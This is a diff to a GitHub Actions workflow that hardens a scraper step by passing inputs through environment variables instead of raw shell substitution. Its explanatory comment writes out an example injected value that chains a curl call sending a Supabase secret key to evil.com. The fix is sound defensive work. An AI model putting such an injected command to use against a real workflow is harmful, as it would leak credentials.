@@ -98,15 +98,29 @@ jobs:
 
       - name: Run scraper
         working-directory: backend
+        # `inputs.limit` and `inputs.cutoff_days` are typed `string` (so the
+        # Action UI accepts an empty default), then validated as integers
+        # by argparse. Pass them via env vars rather than direct
+        # ${{ … }} substitution into the shell — substitution is raw text
+        # replacement done before bash parses the line, so a value like
+        # `100; curl evil.com -d "$SUPABASE_SECRET_KEY"` would otherwise
+        # exfiltrate the service-role key on every Big Scrape a repo
+        # collaborator can dispatch.
+        env:
+          URLS_FILE: ${{ steps.urls.outputs.file }}
+          SCHOOL: ${{ inputs.school }}
+          LIMIT: ${{ inputs.limit }}
+          CUTOFF_DAYS: ${{ inputs.cutoff_days }}
+          DRY_RUN_FLAG: ${{ inputs.dry_run && '--dry-run' || '' }}
         run: |
           mkdir -p logs
           set -o pipefail
           python -u jobs/scrape.py \
-            --urls-file "${{ steps.urls.outputs.file }}" \
-            --school "${{ inputs.school }}" \
-            --limit ${{ inputs.limit }} \
-            --cutoff-days ${{ inputs.cutoff_days }} \
-            ${{ inputs.dry_run && '--dry-run' || '' }} \
+            --urls-file "$URLS_FILE" \
+            --school "$SCHOOL" \
+            --limit "$LIMIT" \
+            --cutoff-days "$CUTOFF_DAYS" \
+            $DRY_RUN_FLAG \
             2>&1 | tee logs/scraping.log
 
       - name: Upload logs as artifact
